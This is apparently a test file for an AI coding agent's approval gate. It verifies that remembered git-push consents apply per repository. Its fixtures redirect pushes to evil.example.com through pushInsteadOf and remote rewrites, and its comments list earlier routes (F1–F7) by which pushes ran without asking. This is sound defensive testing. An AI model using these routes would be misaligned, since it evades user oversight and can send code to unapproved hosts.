// DEC-11f (Jay 2026-11-05) — outward push destinations are remembered PER REPOSITORY.
//
// Requirement: docs/studio-requirements.md REQ-E1a ("Outward destinations", DEC-11f). Before this change a work folder
// holding another git repository (a nested repository or submodule) or more than 4000 folders made every bare
// `git push` ask every time: the agent's shell keeps its folder between commands, and the host could not tell which
// repository a push ran in. Now the host resolves the repository a push really runs in (the shell's folder from the
// SDK PreToolUse hook, then static `cd` steps of an `&&` chain, `-C`, `--git-dir`, `--work-tree`, `GIT_DIR=`) and that
// repository's push URLs (`pushurl`, `insteadOf`/`pushInsteadOf`), and remembers (repository, destination) pairs.
// Anything it cannot resolve still asks every time and is never remembered.
//
// 1 runs the real resolveActionApproval (chatPanelProvider bundled with esbuild, fake VS Code, real git repositories).
//   It comes first so that on the base the first failure is the behavior (base: "it names the nested repository's
//   own remote and will remember it" — the base could not place the push and asked every time), not a missing module.
// 2 runs the real runSdkCoach with a scripted SDK: the PreToolUse hook's `cwd` reaches the approval as `shellCwd`.
// 3 runs the real vendored CLI against a stub gateway (when the binary is present): after a Bash `cd sub`, the hook
//   reports the shell's new folder for the next Bash call. This is the fact the host relies on.
//
// .claude/rules/verification.md §2: every "silent" check has an "asks" control next to it, and the reverse.
// Run: node --experimental-strip-types test/outward-per-repo.smoke.mjs

import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as http from "node:http";
import * as os from "node:os";
import * as path from "node:path";
import vm from "node:vm";
import { execFileSync } from "node:child_process";
import { createRequire, registerHooks } from "node:module";
import { fileURLToPath } from "node:url";
import { webcrypto } from "node:crypto";
import { build } from "esbuild";
import { installCommandApproval } from "./lib/command-approval-harness.mjs";

const stub = new URL("./fixtures/vscode-stub.mjs", import.meta.url).href;
registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier === "vscode") return { url: stub, shortCircuit: true };
    if (specifier.startsWith(".") && !/\.[a-z0-9]+$/i.test(specifier)) {
      try { return nextResolve(`${specifier}.ts`, context); } catch { return nextResolve(specifier, context); }
    }
    return nextResolve(specifier, context);
  },
});

const A = await import("../src/taskCommandAllow.ts");
const FC = await import("../src/folderConsent.ts");

const here = path.dirname(fileURLToPath(import.meta.url));
const extRoot = path.join(here, "..");
const require = createRequire(import.meta.url);
let passed = 0;
const ok = (name) => { passed++; console.log(`✓ ${name}`); };
const tmp = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "outward-per-repo-")));
const gitEnv = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
const git = (cwd, ...args) => execFileSync("git", args, { cwd, stdio: ["ignore", "pipe", "ignore"], env: gitEnv }).toString().trim();

try {
  // ── 1. The real approval host ──
  {
    const bundle = await build({ stdin: { contents: "export {ChatPanelProvider} from './src/chatPanelProvider';", resolveDir: extRoot, loader: "ts" }, bundle: true, platform: "node", format: "cjs", external: ["vscode"], write: false, logLevel: "error" });
    const ws = { folder: undefined };
    const toUri = (p) => ({ fsPath: p, path: p, scheme: "file" });
    const vscode = {
      ViewColumn: { One: 1, Two: 2, Beside: 2 }, ProgressLocation: { Window: 10, Notification: 15 },
      Uri: { file: toUri, joinPath: (u, ...parts) => toUri(path.join(u.fsPath, ...parts)), parse: (x) => toUri(x) },
      commands: { executeCommand: async () => undefined },
      window: { showWarningMessage: async () => undefined, showInformationMessage: async () => undefined },
      workspace: {
        get workspaceFolders() { return ws.folder ? [{ uri: toUri(ws.folder), name: path.basename(ws.folder) }] : undefined; },
        getConfiguration: () => ({ get: (_k, fallback) => fallback }),
      },
    };
    const mod = { exports: {} };
    const env = { ...gitEnv };
    delete env.CDPATH;
    vm.runInNewContext(bundle.outputFiles[0].text, { module: mod, exports: mod.exports, require: (id) => (id === "vscode" ? vscode : require(id)), console: { ...console, log() {}, warn() {} }, process: { ...process, env }, Buffer, URL, TextEncoder, TextDecoder, setTimeout, clearTimeout, AbortSignal, crypto: webcrypto });
    const { ChatPanelProvider } = mod.exports;

    // work/ is the work folder and a repository; work/nested/ is another repository inside it (a nested repo or a
    // submodule checkout); work/big/ holds more than 4000 folders.
    const work = path.join(tmp, "work");
    const nested = path.join(work, "nested");
    const deep = path.join(nested, "src");
    for (const [d, name] of [[work, "work"], [nested, "nested"]]) {
      fs.mkdirSync(d, { recursive: true });
      git(d, "init", "-q", "-b", "main");
      git(d, "remote", "add", "origin", `https://github.com/learner/${name}.git`);
      git(d, "remote", "add", "lab", `git@gitlab.com:learner/${name}.git`);
    }
    fs.mkdirSync(deep, { recursive: true });
    for (let i = 0; i < 4001; i++) fs.mkdirSync(path.join(work, "big", `d${i}`), { recursive: true });

    const state = new Map();
    const adult = { profile_id: "p", activity_id: "e".repeat(64), activity_kind: "personal", sdk_tools: { shell: true }, game: { template_tier: "website" } };
    const makeWindow = (folder) => {
      const h = Object.create(ChatPanelProvider.prototype);
      Object.assign(h, {
        context: { globalState: { get: (k) => state.get(k), update: async (k, v) => { state.set(k, v); } }, workspaceState: { get: () => undefined, update: async () => {} }, secrets: { get: async () => "tok" } },
        cachedProfile: adult, servedWorkspaceRoot: folder, _instructorMode: { isInstructor: false }, activeCohortId: "cohort-1",
        nativeHistoryScope: "activity-1", approvedBrowserOrigins: new Set(), coachDisplayName: () => "코치",
        currentTaskStore: () => ({ getView: () => ({ activeTaskId: "task-1" }) }), turnSeatMinor: false,
        resolveCoachCwd: () => folder,
      });
      h.taskCommandAllows = new A.TaskCommandAllows();
      h.prompts = [];
      installCommandApproval(h, (prompt) => { h.prompts.push(prompt); return typeof h.pick === "function" ? h.pick(prompt) : h.pick; });
      return h;
    };
    ws.folder = work;
    state.set(FC.FOLDER_CONSENT_KEY, FC.writeFolderConsent(undefined, adult.activity_id, FC.canonicalFolder(work), "full"));
    const win = makeWindow(work);
    /** One shell call: `shellCwd` is the folder the agent's shell is in (the SDK hook's cwd), or undefined. */
    const asked = async (command, shellCwd, pick) => {
      win.prompts.length = 0; win.pick = pick;
      const payload = shellCwd === undefined ? { command } : { command, shellCwd };
      const approved = await win.resolveActionApproval({ requestId: "r", kind: "executeShell", description: command, payload });
      return { approved, modals: win.prompts.length, prompt: win.prompts[0] };
    };

    // The shell is inside the nested repository: its push asks once for the nested repository's remote...
    let r = await asked("git push", nested, "허락");
    assert.equal(r.modals, 1, "first push from the nested repository asks once");
    assert.deepEqual(r.prompt.outward, { destinations: ["https://github.com/learner/nested"], remembers: true }, "it names the nested repository's own remote and will remember it");
    // ...and the second push from the same nested repository runs silently (on the base it asked every time).
    r = await asked("git push", nested, undefined);
    assert.deepEqual([r.approved, r.modals], [true, 0], "second push from the nested repository runs silently");
    for (const [c, cwd] of [
      ["git push origin main", nested], ["git push", deep],
      [`cd ${nested} && git push`, work], ["cd nested && git push", work], ["cd nested && git add -A && git commit -m 'x' && git push origin main", work],
      ["git -C nested push", work], [`git -C ${nested} push origin`, tmp], ["cd .. && git push", deep],
      ["GIT_DIR=nested/.git git push origin", work], ["git --git-dir=nested/.git push origin", work],
    ]) {
      r = await asked(c, cwd, undefined);
      assert.deepEqual([r.approved, r.modals], [true, 0], `same repository, same remote, resolved: ${c} (shell in ${path.relative(tmp, cwd) || "."})`);
    }
    ok("nested repository: the first push asks once, later pushes from it (bare, cd, -C, --git-dir, GIT_DIR) run silently");

    // The outer repository is another repository: its push asks for its own remote, even for the same address.
    r = await asked("git push", work, undefined);
    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["https://github.com/learner/work"]], "push from the outer repository asks (another remote)");
    r = await asked("git push https://github.com/learner/nested.git", work, undefined);
    assert.equal(r.modals, 1, "the outer repository pushing to the nested repository's address asks: pairs are per repository");
    r = await asked("git push lab", nested, undefined);
    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["ssh://gitlab.com/learner/nested"]], "another remote of the nested repository asks");
    r = await asked("git push", work, "허락");
    assert.equal(r.modals, 1, "control: allow the outer repository's remote once");
    assert.deepEqual([(await asked("git push", work, undefined)).modals, (await asked("git push", path.join(work, "big"), undefined)).modals, (await asked("git push", nested, undefined)).modals], [0, 0, 0], "both pairs remembered, each for its own repository; more than 4000 folders no longer matter");
    ok("outer repository to a different remote asks; the same address from another repository asks; both pairs remembered");

    // pushurl and insteadOf / pushInsteadOf rewrites change the destination: asked again for the new one.
    git(nested, "config", "remote.origin.pushurl", "https://gitlab.com/learner/mirror.git");
    r = await asked("git push", nested, undefined);
    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["https://gitlab.com/learner/mirror"]], "a pushurl sends elsewhere: asks for that destination");
    git(nested, "config", "--unset", "remote.origin.pushurl");
    git(nested, "config", "url.ssh://git@evil.example.com/.pushInsteadOf", "https://github.com/");
    r = await asked("git push", nested, undefined);
    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["ssh://evil.example.com/learner/nested"]], "a pushInsteadOf rewrite sends elsewhere: asks for the rewritten destination");
    git(nested, "config", "--unset", "url.ssh://git@evil.example.com/.pushinsteadof");
    assert.equal((await asked("git push", nested, undefined)).modals, 0, "control: rewrite removed, remembered again");
    ok("pushurl and pushInsteadOf rewrites are resolved: the real destination asks");

    // Verify r1 (head 3f18943f0), each ran silently there:
    // F1 — git's -C is a chdir: `-C lnk/..` is the parent of the link's TARGET (another repository), not work/.
    const outside = path.join(tmp, "other");
    fs.mkdirSync(path.join(outside, "sub"), { recursive: true });
    git(outside, "init", "-q", "-b", "main"); git(outside, "remote", "add", "origin", "https://github.com/learner/other.git");
    fs.symlinkSync(path.join(outside, "sub"), path.join(work, "lnk"));
    for (const c of ["git -C lnk/.. push origin", "cd lnk && git -C .. push origin"]) {
      r = await asked(c, work, undefined);
      assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["https://github.com/learner/other"]], `F1: ${c} is the linked repository's push: asks for its remote`);
    }
    assert.equal((await asked("cd lnk/.. && git push origin", work, undefined)).modals, 0, "control: the shell's cd is logical, `cd lnk/..` is work/ (remembered)");
    // F2/F3 — a command before the push (git log --output, an append to .git/config, any program) may rewrite where it goes.
    for (const [c, cwd] of [
      ["git log -1 --format=x --output=.git/config && git push origin", nested], ["git show -s --format=x --output=.git/config && git push origin", nested],
      ["git diff --output=.git/config && git push origin", nested], ["git stash branch x && git push origin", nested],
      ["printf 'x' >> .git/config && git push origin", nested], ["npm test && git push", nested], ["touch x && GIT_DIR=nested/.git git push origin", work],
      ["sh -c 'printf x >> .git/config && git push origin'", nested],
    ]) {
      r = await asked(c, cwd, "허락");
      assert.equal(r.modals, 1, `F2/F3: ${c} asks`);
      assert.equal((await asked(c, cwd, undefined)).modals, 1, `F2/F3: ${c} asks again, never remembered`);
    }
    assert.equal((await asked("git add -A && git commit -m 'x' && git push origin", nested, undefined)).modals, 0, "control: add and commit before the push stay silent");
    ok("verify r1: -C through a link resolves on disk; a command before the push (log/show/diff --output, appends, programs) asks");

    // Unresolvable: asks every time and is never remembered.
    for (const [c, cwd] of [
      ['cd "$X" && git push', work], ["cd $X && git push", nested], ["cd nested; git push", work], ["cd nested || true && git push", work],
      ["(cd nested && git push)", work], ["cd nested && npm test && git push", work], ["git clone https://github.com/learner/nested.git n2 && cd n2 && git push", work],
      ["cd ~ && git push", work], ["cd - && git push", work], ["git switch other && git push", nested], ["git -C $D push", work],
      ["GIT_DIR=$G git push origin", work], ["git --git-dir=$G push origin", work], ["export GIT_DIR=nested/.git; git push origin", work],
      ["git push", path.join(tmp)], ["git push", path.join(tmp, "missing")],
    ]) {
      r = await asked(c, cwd, "허락");
      assert.equal(r.modals, 1, `unresolvable asks: ${c}`);
      // Some take the ordinary shell confirm before this layer (a link-making word such as a URL to clone, or destructive).
      if (r.prompt.purpose === "outward") assert.deepEqual(r.prompt.outward, { destinations: [], remembers: false }, `and says it will ask again: ${c}`);
      assert.equal((await asked(c, cwd, undefined)).modals, 1, `asked again, never remembered: ${c}`);
    }
    // Without the shell's folder (another runtime), a folder with another repository inside cannot place a bare push.
    for (const c of ["git push", "cd nested && git push", "git -C nested push"]) assert.equal((await asked(c, undefined, undefined)).modals, 1, `no shell folder, nested repository: ${c} asks`);
    assert.equal((await asked(`cd ${nested} && git push`, undefined, undefined)).modals, 0, "no shell folder: an absolute cd still places the push");
    ok("unresolvable pushes (cd \"$X\", cd;, subshell, cd after another command, branch switch, run-time git dir) ask every time");

    // Verify r2 (head a7e6c21e5), each ran silently there:
    // F5 — a silent `git config submodule.recurse true` (or push.recurseSubmodules on-demand) made a remembered
    // `git push origin` also push a submodule's commits to the submodule's own remote. Any scope git reads counts.
    assert.equal((await asked("git push origin", work, undefined)).modals, 0, "control: the outer repository's origin is remembered");
    const incl = path.join(tmp, "recurse.inc");
    fs.writeFileSync(incl, "[submodule]\n\trecurse\n");
    const globalCfg = path.join(tmp, "global.gitconfig");
    for (const [label, on, off] of [
      ["submodule.recurse true", () => git(work, "config", "submodule.recurse", "true"), () => git(work, "config", "--unset", "submodule.recurse")],
      ["push.recurseSubmodules on-demand", () => git(work, "config", "push.recurseSubmodules", "on-demand"), () => git(work, "config", "--unset", "push.recurseSubmodules")],
      ["push.recurseSubmodules only", () => git(work, "config", "push.recurseSubmodules", "only"), () => git(work, "config", "--unset", "push.recurseSubmodules")],
      ["includeIf adds a valueless submodule.recurse", () => git(work, "config", `includeIf.gitdir:${work}/.git.path`, incl), () => git(work, "config", "--unset", `includeIf.gitdir:${work}/.git.path`)],
      ["global config submodule.recurse true", () => { fs.writeFileSync(globalCfg, "[submodule]\n\trecurse = true\n"); env.GIT_CONFIG_GLOBAL = globalCfg; }, () => { env.GIT_CONFIG_GLOBAL = "/dev/null"; }],
    ]) {
      on();
      r = await asked("git push origin", work, "허락");
      assert.equal(r.modals, 1, `F5: ${label}: a remembered push asks`);
      assert.deepEqual(r.prompt.outward, { destinations: [], remembers: false }, `F5: ${label}: and says it will ask again`);
      assert.equal((await asked("git push origin", work, undefined)).modals, 1, `F5: ${label}: never remembered`);
      off();
      assert.equal((await asked("git push origin", work, undefined)).modals, 0, `F5 control: ${label} removed, silent again`);
    }
    for (const [k, v] of [["submodule.recurse", "false"], ["push.recurseSubmodules", "check"], ["push.recurseSubmodules", "no"]]) {
      git(work, "config", k, v);
      assert.equal((await asked("git push origin", work, undefined)).modals, 0, `F5 control: ${k}=${v} pushes no submodule, stays silent`);
      git(work, "config", "--unset", k);
    }
    ok("verify r2 F5: submodule recursion from local, include or global config makes a remembered push ask every time");

    // F6 — a remote name with `/` was read as a folder: `foo/bar` allowed as a local folder, then
    // `rm -rf foo && git remote add foo/bar https://evil…` and `git push foo/bar` ran silently to evil.
    fs.mkdirSync(path.join(work, "foo"));
    git(work, "init", "-q", "--bare", "foo/bar");
    r = await asked("git push foo/bar HEAD:refs/heads/x", work, "허락");
    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [`file://${work}/foo/bar`]], "F6: a local folder push asks once for the folder");
    assert.equal((await asked("git push foo/bar HEAD:refs/heads/x", work, undefined)).modals, 0, "control: the same folder is remembered");
    fs.rmSync(path.join(work, "foo"), { recursive: true, force: true });
    git(work, "remote", "add", "foo/bar", "https://evil.example.com/x.git");
    r = await asked("git push foo/bar HEAD:refs/heads/x", work, undefined);
    assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, ["https://evil.example.com/x"]], "F6: the name is now a remote: asks for the remote's address");
    for (const [name, url] of [["Up.Per.Case", "https://evil.example.com/u.git"], ["a.b", "https://evil.example.com/d.git"], ["team/a.b", "https://evil.example.com/s.git"]]) {
      git(work, "remote", "add", name, url);
      r = await asked(`git push ${name}`, work, undefined);
      assert.deepEqual([r.modals, r.prompt?.outward?.destinations], [1, [url.replace(/\.git$/, "")]], `F6: remote ${name} resolves to its address`);
    }
    r = await asked("git push nosuch/x", work, "허락");
    assert.deepEqual([r.modals, r.prompt?.outward], [1, { destinations: [], remembers: false }], "F6: neither a remote nor an existing folder: asks and says it will ask again");
    assert.equal((await asked("git push nosuch/x", work, undefined)).modals, 1, "F6: never remembered");
    // F7 (verify r3, head 9a09316b3) — `remote get-url` answers only for the repository's own remotes; git push also uses
    // one defined only in the global config or an include, so a word allowed as a folder or an address can be taken over.
    fs.mkdirSync(path.join(work, "loc"));
    git(work, "init", "-q", "--bare", "loc/r");
    r = await asked("git push loc/r HEAD:refs/heads/x", work, "허락");
    assert.equal(r.modals, 1, "F7 control: a local folder asks once");
    assert.equal((await asked("git push loc/r HEAD:refs/heads/x", work, undefined)).modals, 0, "F7 control: then silent");
    r = await asked("git push git@github.com:learner/work.git", work, "허락");
    assert.equal(r.modals, 1, "F7 control: a written-out address asks once");
    assert.equal((await asked("git push git@github.com:learner/work.git", work, undefined)).modals, 0, "F7 control: then silent");
    const inc = path.join(tmp, "remote.inc");
    for (const [label, word, body, useInclude] of [
      ["global remote named like an allowed folder", "loc/r", '[remote "loc/r"]\n\turl = https://evil.example.com/g.git\n', false],
      ["global remote named like an allowed address", "git@github.com:learner/work.git", '[remote "git@github.com:learner/work.git"]\n\turl = https://evil.example.com/h.git\n', false],
      ["remote from a globally included file", "loc/r", '[remote "loc/r"]\n\tpushurl = https://evil.example.com/i.git\n', true],
    ]) {
      if (useInclude) { fs.writeFileSync(inc, body); fs.writeFileSync(globalCfg, `[include]\n\tpath = ${inc}\n`); } else fs.writeFileSync(globalCfg, body);
      env.GIT_CONFIG_GLOBAL = globalCfg;
      const c = word === "loc/r" ? "git push loc/r HEAD:refs/heads/x" : `git push ${word}`;
      r = await asked(c, work, "허락");
      assert.deepEqual([r.modals, r.prompt?.outward], [1, { destinations: [], remembers: false }], `F7: ${label}: asks and says it will ask again`);
      assert.equal((await asked(c, work, undefined)).modals, 1, `F7: ${label}: never remembered`);
      env.GIT_CONFIG_GLOBAL = "/dev/null";
      assert.equal((await asked(c, work, undefined)).modals, 0, `F7 control: ${label} removed, silent again`);
    }
    ok("verify r2 F6: a push word is looked up as a remote first (slashes, dots, case); otherwise only an anchored or existing folder");
  }

  // ── 2. runSdkCoach: the PreToolUse hook's cwd reaches the approval as shellCwd ──
  {
    process.env.HOME = path.join(tmp, "home");
    fs.mkdirSync(process.env.HOME, { recursive: true });
    const { runSdkCoach } = await import("../src/sdkCoach.ts");
    const WS = path.join(tmp, "work");
    const ADULT = { profile_id: "adult-shell", activity_kind: "personal", game: { template_tier: "website" }, sdk_tools: { read: true, write: true, shell: true }, orchestrator: { enabled: false, reason: "orchestrator_off" } };
    const base = (extra) => ({
      token: "hps-token-per-repo", model: "claude-sonnet-5-5", turnId: "turn_per_repo", profile: ADULT, systemPrompt: "",
      history: [], userText: "올려 줘", signal: new AbortController().signal, cwd: WS, stallTimeoutMs: 0,
      onDelta: () => {}, onCitations: () => {}, onAssetScore: () => {}, gatewayUrl: "https://api.hypeproof-ai.xyz/v1",
      binaryResolution: { available: true, source: "setting", path: "/opt/claude", reasons: [] }, ...extra,
    });
    const seen = [];
    const scripted = (calls) => ({
      createSdkMcpServer: (o) => ({ name: o.name, tools: o.tools ?? [] }),
      tool: (name) => ({ name }),
      query({ options }) {
        return (async function* () {
          yield { type: "system", subtype: "init" };
          for (const [id, cwd, command] of calls) {
            for (const m of options.hooks?.PreToolUse ?? []) {
              if (m.matcher && !new RegExp(`^(${m.matcher})$`).test("Bash")) continue;
              for (const h of m.hooks) await h({ hook_event_name: "PreToolUse", session_id: "s", transcript_path: "", cwd, tool_name: "Bash", tool_input: { command }, tool_use_id: id }, id, { signal: new AbortController().signal });
            }
            seen.push(await options.canUseTool("Bash", { command }, { signal: new AbortController().signal, toolUseID: id }));
          }
          yield { type: "result", subtype: "success", stop_reason: "end_turn" };
        })();
      },
    });
    const actions = [];
    const requestApproval = async (action) => { actions.push(action); return { approved: false, actor: "user" }; };
    await runSdkCoach(base({ sdk: scripted([["toolu_1", path.join(WS, "nested"), "git push"], ["toolu_2", WS, "git push origin"]]), requestApproval }));
    assert.deepEqual(actions.map((a) => a.shellCwd), [path.join(WS, "nested"), WS], "each Bash approval carries the folder its own hook reported");
    const { sdkToolToActionRequest } = await import("../src/sdkCoachHelpers.ts");
    assert.equal(sdkToolToActionRequest(actions[0]).payload.shellCwd, path.join(WS, "nested"), "and the shell request's payload carries it to the host");
    assert.equal(sdkToolToActionRequest({ toolName: "Bash", input: { command: "git push", shellCwd: "/evil" } }).payload.shellCwd, undefined, "never taken from the tool input");
    // Control: a minor seat (not auto) registers no hook, and the approval carries no folder.
    actions.length = 0;
    const minor = { ...ADULT, profile_id: "kid-shell", minor_cohort: true };
    let hooked = null;
    const peek = { ...scripted([["toolu_3", path.join(WS, "nested"), "git push"]]), query(a) { hooked = a.options.hooks?.PreToolUse ?? null; return scripted([["toolu_3", path.join(WS, "nested"), "git push"]]).query(a); } };
    await runSdkCoach(base({ profile: minor, sdk: peek, requestApproval }));
    assert.equal(hooked, null, "minor seat: no PreToolUse hook");
    assert.ok(actions.every((a) => a.shellCwd === undefined), "minor seat: no shell folder on the approval");
    ok("runSdkCoach: the PreToolUse hook's cwd reaches the Bash approval as shellCwd (auto seats only, never from tool input)");
  }

  // ── 3. The real CLI: the hook's cwd follows the shell's `cd` ──
  {
    const binary = path.join(extRoot, "node_modules/@anthropic-ai", `claude-agent-sdk-${process.platform}-${process.arch}`, process.platform === "win32" ? "claude.exe" : "claude");
    if (!fs.existsSync(binary)) {
      if (process.env.OUTWARD_PER_REPO_REQUIRE_CLI === "1") throw new Error("vendored CLI required");
      console.log(`NOT RUN outward per repo real CLI: no vendored binary at ${binary}`);
    } else {
      const { runSdkCoach } = await import("../src/sdkCoach.ts");
      const WS = path.join(tmp, "cli-ws");
      fs.mkdirSync(path.join(WS, "sub"), { recursive: true });
      const sse = (events) => events.map(([e, d]) => `event: ${e}\ndata: ${JSON.stringify(d)}\n\n`).join("");
      const start = { type: "message_start", message: { id: "msg", type: "message", role: "assistant", model: "claude-sonnet-5-5", content: [], stop_reason: null, usage: { input_tokens: 1, output_tokens: 1 } } };
      const toolUse = (id, command) => sse([
        ["message_start", start],
        ["content_block_start", { type: "content_block_start", index: 0, content_block: { type: "tool_use", id, name: "Bash", input: {} } }],
        ["content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "input_json_delta", partial_json: JSON.stringify({ command, description: "step" }) } }],
        ["content_block_stop", { type: "content_block_stop", index: 0 }],
        ["message_delta", { type: "message_delta", delta: { stop_reason: "tool_use" }, usage: { output_tokens: 1 } }],
        ["message_stop", { type: "message_stop" }],
      ]);
      const text = sse([
        ["message_start", start],
        ["content_block_start", { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } }],
        ["content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "네" } }],
        ["content_block_stop", { type: "content_block_stop", index: 0 }],
        ["message_delta", { type: "message_delta", delta: { stop_reason: "end_turn" }, usage: { output_tokens: 1 } }],
        ["message_stop", { type: "message_stop" }],
      ]);
      const server = http.createServer((req, res) => {
        let raw = "";
        req.on("data", (c) => { raw += c; });
        req.on("end", () => {
          if (!req.url.includes("/messages")) { res.writeHead(404, { "content-type": "application/json" }); res.end("{}"); return; }
          let body = {};
          try { body = JSON.parse(raw); } catch { /* not JSON */ }
          const main = Array.isArray(body.tools) && body.tools.some((t) => t?.name === "Bash");
          const results = JSON.stringify(body.messages ?? []).split('"tool_result"').length - 1;
          res.writeHead(200, { "content-type": "text/event-stream" });
          res.end(!main ? text : results === 0 ? toolUse("toolu_cd", "cd sub") : results === 1 ? toolUse("toolu_push", "git push origin main") : text);
        });
      });
      await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
      const actions = [];
      try {
        await runSdkCoach({
          token: "hps-token-per-repo", model: "claude-sonnet-5-5", turnId: "turn_cli", systemPrompt: "", history: [], userText: "올려 줘",
          profile: { profile_id: "adult-shell", activity_kind: "personal", game: { template_tier: "website" }, sdk_tools: { read: true, write: true, shell: true }, orchestrator: { enabled: false, reason: "orchestrator_off" } },
          signal: AbortSignal.timeout(120_000), cwd: WS, stallTimeoutMs: 0, onDelta: () => {}, onCitations: () => {}, onAssetScore: () => {},
          gatewayUrl: `http://127.0.0.1:${server.address().port}/v1`, binaryResolution: { available: true, source: "setting", path: binary, reasons: [] },
          requestApproval: async (action) => { actions.push(action); return { approved: false, actor: "user" }; },
        });
      } finally { server.close(); }
      const push = actions.find((a) => String(a.input?.command).includes("git push"));
      assert.ok(push, "control: the CLI asked to approve the push (the `cd` ran without a modal under auto)");
      assert.equal(fs.realpathSync.native(push.shellCwd), fs.realpathSync.native(path.join(WS, "sub")), "the hook reported the folder the shell moved to");
      ok("real CLI: after Bash `cd sub`, the next Bash call's hook cwd is sub (the host resolves the push there)");
    }
  }
} finally {
  fs.rmSync(tmp, { recursive: true, force: true });
}
console.log(`outward-per-repo: ${passed} checks passed`);
